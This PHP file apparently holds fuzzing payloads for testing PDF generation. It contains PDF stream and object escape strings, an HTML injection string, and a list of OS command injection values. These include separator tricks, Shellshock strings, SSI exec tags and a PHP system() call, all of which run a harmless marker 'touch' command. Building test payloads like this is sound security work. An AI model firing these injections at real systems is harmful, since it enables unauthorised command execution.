<?php

$xref = <<<EOD

endobj
xref
0 12
0000000000 65535 f 
0000000757 00000 n 
0000001473 00000 n 
0000000816 00000 n 
0000001033 00000 n 
0000000922 00000 n 
0000001598 00000 n 
0000000015 00000 n 
0000000483 00000 n 
0000001814 00000 n 
0000002011 00000 n 
0000006734 00000 n 
trailer
<< /Size 12 /Root 11 0 R /Info 9 0 R /ID [ <4236cae0fe45a1ddcc1621cdcae97a10> <4236cae0fe45a1ddcc1621cdcae97a10> ] >>
startxref
6943
%%EOF
EOD;

$escape_seq = array(
// STREAM ESCAPE
"hacker

endstream",

// HTML ESCAPE
"<h1>Like exploits\) <a href='http://kellsrealwww.com' style='text-decoration:none;background-color:#CC0000;color:black;'></h1>
<img src='images/logo_example.png' alt='test alt attribute' width='100' height='100' border='0' />",

// OBJECT ESCAPE
"hacker\\",
"hacker\\\\",
"hacker󶶜",
"hacker✓",
"hackerܮ",
"hacker ܏ ",
"hackerܢ ",
"hacker)",
" hacker© ",
"hacker Ʃ ",
"hacker⩾",
"hackerΩ",
"hackerω",
"hacker💩",
"hackerỨ",
"hackerứ",
"hacker↩",
"hackerÉ",
"hackeré",
"hacker𝐩",
"hacker𝑩",
"hacker𐩥",
"hackerʩ",
"hacker⍩",
"hacker🀩",
"hacker𐢩",
"hacker╩",
"hacker%%EOF",
"hacker ",
"hacker	",
"hacker",
"hacker
",
"hacker\\] TJ ET
endstream",
"'hacker\\\\] TJ ET
endstream",
"hacker\\] TJ ET
endstream",
"hacker󶶜] TJ ET
endstream",
"hacker󶶜] TJ ET
endstream",
"hacker✓] TJ ET
endstream",
"hacker✓] TJ ET
endstream",
"hackerܮ] TJ ET
endstream",
"hackerܮ] TJ ET
endstream",
"hacker ܏ ] TJ ET
endstream",
"hacker ܏ ] TJ ET
endstream",
"hackerܢ ] TJ ET
endstream",
"hackerܢ ] TJ ET
endstream",
"hacker)] TJ ET
endstream",
"hacker© ] TJ ET
endstream",
"hackerƩ ] TJ ET
endstream",
"hacker⩾] TJ ET
endstream",
"hackerΩ] TJ ET
endstream",
"hackerω] TJ ET
endstream",
"hacker💩] TJ ET
endstream",
"hackerỨ] TJ ET
endstream",
"hackerứ] TJ ET
endstream",
"hacker↩] TJ ET
endstream",
"hackerÉ] TJ ET
endstream",
"hackeré] TJ ET
endstream",
"hacker𝐩] TJ ET
endstream",
"hacker𝑩] TJ ET
endstream",
"hacker𐩥] TJ ET
endstream",
"hackerʩ] TJ ET
endstream",
"hacker⍩] TJ ET
endstream",
"hacker🀩] TJ ET
endstream",
"hacker𐢩] TJ ET
endstream",
"hacker╩] TJ ET
endstream",
"hacker%%EOF] TJ ET
endstream",
"hacker ] TJ ET
endstream",
"hacker	] TJ ET
endstream",
"hacker] TJ ET
endstream",
"hacker
] TJ ET
endstream"
);

$os_commands = array(
"touch /var/www/myapp/test",
" touch /var/www/myapp/test",
";touch /var/www/myapp/test;",
"; touch /var/www/myapp/test;",
";touch /var/www/myapp/test",
"; touch /var/www/myapp/test",
";system('touch /var/www/myapp/test')",
"; system('touch /var/www/myapp/test')",
"|touch /var/www/myapp/test",
"| touch /var/www/myapp/test",
"|touch /var/www/myapp/test;",
"| touch /var/www/myapp/test;",
"&& touch /var/www/myapp/test",
" && touch /var/www/myapp/test",
"a && touch /var/www/myapp/test",
"a && touch /var/www/myapp/test;",
"1 && touch /var/www/myapp/test",
"1 && touch /var/www/myapp/test;",
"1' && touch /var/www/myapp/test",
"1' && touch /var/www/myapp/test;",
"1' && touch /var/www/myapp/test#",
"a' && touch /var/www/myapp/test",
"a' && touch /var/www/myapp/test;",
"a' && touch /var/www/myapp/test#",
'1" && touch /var/www/myapp/test',
'1" && touch /var/www/myapp/test;',
'1" && touch /var/www/myapp/test#',
'a" && touch /var/www/myapp/test',
'a" && touch /var/www/myapp/test;',
'a" && touch /var/www/myapp/test#',
"& touch /var/www/myapp/test",
" & touch /var/www/myapp/test",
"`touch /var/www/myapp/test`",
"`touch /var/www/myapp/test`",
"a);touch /var/www/myapp/test",
"a;touch /var/www/myapp/test",
"a);touch /var/www/myapp/test;",
"a;touch /var/www/myapp/test;",
"a);touch /var/www/myapp/test|",
"a;touch /var/www/myapp/test|",
"a)|touch /var/www/myapp/test",
"a|touch /var/www/myapp/test",
"a)|touch /var/www/myapp/test;",
"a|touch /var/www/myapp/test",
"&lt;!--#exec%20cmd=&quot;touch%20/var/www/myapp/test&quot;--&gt;",
"&lt;!--#exec%20cmd=&quot;touch%20/var/www/myapp/test;--&gt;",
"%0Atouch%20/var/www/myapp/test",
"%0Atouch%20/var/www/myapp/test%0A",
"$;touch /var/www/myapp/test",
'() { :;}; /bin/bash -c "sleep 100 && touch /var/www/myapp/test"',
'() { :;}; /bin/bash -c "touch /var/www/myapp/test"',
"$(`touch /var/www/myapp/test`)",
'<!--#exec cmd="touch /var/www/myapp/test";-->',
'<?php system("touch /var/www/myapp/test");?>',
"touch /var/www/myapp/test #",
"touch /var/www/myapp/test#"
);

?>